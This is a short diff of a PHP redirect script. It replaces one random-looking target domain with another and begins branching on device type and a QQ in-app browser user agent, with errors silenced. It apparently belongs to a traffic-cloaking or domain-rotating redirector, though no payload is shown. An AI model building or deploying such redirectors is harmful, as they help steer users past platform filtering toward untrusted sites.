@@ -3,7 +3,7 @@
 error_reporting(0);
 header('Content-Type: text/html; charset=UTF-8');
 header('Cache-Control: no-store, no-cache');
-$geturl = 'https://2pzd3.bnaksm.com/y5wh1';
+$geturl = 'https://07aht.dbybgqo.com/f4dvk';
 $shebeiid = get_device_type();
 if(strpos($_SERVER['HTTP_USER_AGENT'], 'QQ/')!==false){
 if($shebeiid == 'android'){
